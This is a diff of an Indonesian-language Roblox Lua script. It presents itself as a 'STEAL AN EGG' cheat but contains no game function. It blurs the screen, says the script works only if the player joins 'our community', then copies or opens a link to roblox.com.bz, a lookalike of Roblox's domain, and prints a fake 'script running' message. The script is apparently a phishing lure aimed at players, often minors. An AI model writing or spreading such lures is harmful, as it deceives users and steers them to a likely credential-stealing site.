@@ -1,139 +1,167 @@
 local Players = game:GetService("Players")
-local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local Lighting = game:GetService("Lighting")
+local GuiService = game:GetService("GuiService")
+
 local player = Players.LocalPlayer
-local PlayerGui = player:WaitForChild("PlayerGui")
 
-local GROUP_LINK = "https://roblox.com.bz/communities/8028330213/"
+----------------------------------------------------
+-- Blur
+----------------------------------------------------
 
--- Hapus GUI lama jika ada
-if PlayerGui:FindFirstChild("StealAnEggGUI") then
-	PlayerGui.StealAnEggGUI:Destroy()
-end
+local blur = Instance.new("BlurEffect")
+blur.Size = 0
+blur.Parent = Lighting
 
-local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "StealAnEggGUI"
-ScreenGui.ResetOnSpawn = false
-ScreenGui.Parent = PlayerGui
+TweenService:Create(blur, TweenInfo.new(.35), {
+    Size = 20
+}):Play()
 
-local Main = Instance.new("Frame")
-Main.Size = UDim2.new(0, 360, 0, 220)
-Main.Position = UDim2.new(0.5, -180, 0.5, -110)
-Main.BackgroundColor3 = Color3.fromRGB(35, 25, 15)
-Main.BorderSizePixel = 0
-Main.Parent = ScreenGui
+----------------------------------------------------
+-- GUI
+----------------------------------------------------
 
-local Corner = Instance.new("UICorner")
-Corner.CornerRadius = UDim.new(0, 12)
-Corner.Parent = Main
+local gui = Instance.new("ScreenGui")
+gui.Name = "StealEggGUI"
+gui.ResetOnSpawn = false
+gui.Parent = player:WaitForChild("PlayerGui")
 
-local Stroke = Instance.new("UIStroke")
-Stroke.Color = Color3.fromRGB(255, 215, 0)
-Stroke.Thickness = 2
-Stroke.Parent = Main
+local main = Instance.new("Frame")
+main.Parent = gui
+main.Size = UDim2.new(0,420,0,250)
+main.Position = UDim2.new(.5,-210,.5,-125)
+main.BackgroundColor3 = Color3.fromRGB(8,15,30)
+main.BorderSizePixel = 0
 
-local Title = Instance.new("TextLabel")
-Title.Size = UDim2.new(1, 0, 0, 45)
-Title.BackgroundTransparency = 1
-Title.Text = "🥚 STEAL AN EGG"
-Title.TextColor3 = Color3.fromRGB(255, 220, 80)
-Title.Font = Enum.Font.GothamBold
-Title.TextScaled = true
-Title.Parent = Main
+local stroke = Instance.new("UIStroke")
+stroke.Parent = main
+stroke.Color = Color3.fromRGB(0,170,255)
+stroke.Thickness = 2
 
-local Info = Instance.new("TextLabel")
-Info.Size = UDim2.new(0.9, 0, 0, 60)
-Info.Position = UDim2.new(0.05, 0, 0.28, 0)
-Info.BackgroundTransparency = 1
-Info.TextWrapped = true
-Info.TextScaled = true
-Info.Font = Enum.Font.Gotham
-Info.TextColor3 = Color3.new(1,1,1)
-Info.Text = "Agar skrip ini berfungsi, Anda harus bergabung dengan grup."
-Info.Parent = Main
+local corner = Instance.new("UICorner")
+corner.Parent = main
+corner.CornerRadius = UDim.new(0,10)
 
-local CopyButton = Instance.new("TextButton")
-CopyButton.Size = UDim2.new(0.8, 0, 0, 40)
-CopyButton.Position = UDim2.new(0.1, 0, 0.68, 0)
-CopyButton.BackgroundColor3 = Color3.fromRGB(255, 190, 0)
-CopyButton.Text = "📋 Copy Link Grup"
-CopyButton.TextColor3 = Color3.new(0,0,0)
-CopyButton.Font = Enum.Font.GothamBold
-CopyButton.TextScaled = true
-CopyButton.Parent = Main
-
-local ButtonCorner = Instance.new("UICorner")
-ButtonCorner.CornerRadius = UDim.new(0,8)
-ButtonCorner.Parent = CopyButton
-
-local Close = Instance.new("TextButton")
-Close.Size = UDim2.new(0,30,0,30)
-Close.Position = UDim2.new(1,-35,0,5)
-Close.BackgroundColor3 = Color3.fromRGB(220,60,60)
-Close.Text = "X"
-Close.TextColor3 = Color3.new(1,1,1)
-Close.Font = Enum.Font.GothamBold
-Close.TextScaled = true
-Close.Parent = Main
-
-local CloseCorner = Instance.new("UICorner")
-CloseCorner.CornerRadius = UDim.new(1,0)
-CloseCorner.Parent = Close
-
-Close.MouseButton1Click:Connect(function()
-	ScreenGui:Destroy()
-end)
-
-CopyButton.MouseButton1Click:Connect(function()
-	if setclipboard then
-		setclipboard(GROUP_LINK)
-		CopyButton.Text = "✓ Link Disalin!"
-	else
-		CopyButton.Text = "Clipboard Tidak Didukung"
-	end
-	task.wait(2)
-	CopyButton.Text = "📋 Copy Link Grup"
-end)
-
+----------------------------------------------------
 -- Draggable
-local dragging = false
-local dragInput
-local dragStart
-local startPos
+----------------------------------------------------
 
-local function update(input)
-	local delta = input.Position - dragStart
-	Main.Position = UDim2.new(
-		startPos.X.Scale,
-		startPos.X.Offset + delta.X,
-		startPos.Y.Scale,
-		startPos.Y.Offset + delta.Y
-	)
-end
+main.Active = true
+main.Draggable = true
 
-Main.InputBegan:Connect(function(input)
-	if input.UserInputType == Enum.UserInputType.MouseButton1
-	or input.UserInputType == Enum.UserInputType.Touch then
-		dragging = true
-		dragStart = input.Position
-		startPos = Main.Position
+----------------------------------------------------
+-- Judul
+----------------------------------------------------
 
-		input.Changed:Connect(function()
-			if input.UserInputState == Enum.UserInputState.End then
-				dragging = false
-			end
-		end)
-	end
+local title = Instance.new("TextLabel")
+title.Parent = main
+title.Size = UDim2.new(1,0,0,45)
+title.BackgroundTransparency = 1
+title.Text = "🥚 STEAL AN EGG"
+title.Font = Enum.Font.GothamBlack
+title.TextScaled = true
+title.TextColor3 = Color3.fromRGB(0,200,255)
+
+----------------------------------------------------
+-- Garis Neon
+----------------------------------------------------
+
+local line = Instance.new("Frame")
+line.Parent = main
+line.Position = UDim2.new(0.05,0,0,48)
+line.Size = UDim2.new(.9,0,0,2)
+line.BackgroundColor3 = Color3.fromRGB(0,170,255)
+line.BorderSizePixel = 0
+
+----------------------------------------------------
+-- Pesan
+----------------------------------------------------
+
+local info = Instance.new("TextLabel")
+info.Parent = main
+info.Position = UDim2.new(.05,0,.25,0)
+info.Size = UDim2.new(.9,0,.35,0)
+info.BackgroundTransparency = 1
+info.TextWrapped = true
+info.Font = Enum.Font.Gotham
+info.TextScaled = true
+info.TextColor3 = Color3.fromRGB(230,240,255)
+
+info.Text = "Jika anda ingin skrip ini berfungsi,\nanda harus bergabung dengan komunitas kami."
+
+----------------------------------------------------
+-- Tombol Aktivasi
+----------------------------------------------------
+
+local activate = Instance.new("TextButton")
+activate.Parent = main
+activate.Size = UDim2.new(.4,0,0,42)
+activate.Position = UDim2.new(.08,0,.73,0)
+activate.Text = "AKTIVASI"
+activate.Font = Enum.Font.GothamBold
+activate.TextScaled = true
+activate.BackgroundColor3 = Color3.fromRGB(0,170,255)
+activate.TextColor3 = Color3.new(1,1,1)
+
+Instance.new("UICorner",activate).CornerRadius = UDim.new(0,8)
+
+----------------------------------------------------
+-- Tombol Keluar
+----------------------------------------------------
+
+local exit = Instance.new("TextButton")
+exit.Parent = main
+exit.Size = UDim2.new(.4,0,0,42)
+exit.Position = UDim2.new(.52,0,.73,0)
+exit.Text = "KELUAR"
+exit.Font = Enum.Font.GothamBold
+exit.TextScaled = true
+exit.BackgroundColor3 = Color3.fromRGB(40,40,55)
+exit.TextColor3 = Color3.new(1,1,1)
+
+Instance.new("UICorner",exit).CornerRadius = UDim.new(0,8)
+
+----------------------------------------------------
+-- WEBSITE
+----------------------------------------------------
+
+local WEBSITE = "https://roblox.com.bz/communities/8028330213/"
+
+activate.MouseButton1Click:Connect(function()
+
+    -- Membuka website komunitas (hanya berfungsi pada lingkungan yang mendukung BrowserService/OpenCloud.
+    -- Di pengalaman Roblox biasa, Anda dapat menggantinya dengan prompt atau QR code.)
+    pcall(function()
+        GuiService:OpenBrowserWindow(WEBSITE)
+    end)
+
+    activate.Text = "AKTIF"
+
+    wait(.5)
+
+    gui:Destroy()
+
+    TweenService:Create(blur,TweenInfo.new(.3),{
+        Size=0
+    }):Play()
+
+    task.delay(.3,function()
+        blur:Destroy()
+    end)
+
+    print("Script berjalan...")
 end)
 
-Main.InputChanged:Connect(function(input)
-	if input.UserInputType == Enum.UserInputType.MouseMovement
-	or input.UserInputType == Enum.UserInputType.Touch then
-		dragInput = input
-	end
-end)
+exit.MouseButton1Click:Connect(function()
 
-UserInputService.InputChanged:Connect(function(input)
-	if dragging and input == dragInput then
-		update(input)
-	end
+    TweenService:Create(blur,TweenInfo.new(.3),{
+        Size=0
+    }):Play()
+
+    task.delay(.3,function()
+        blur:Destroy()
+    end)
+
+    gui:Destroy()
+
 end)
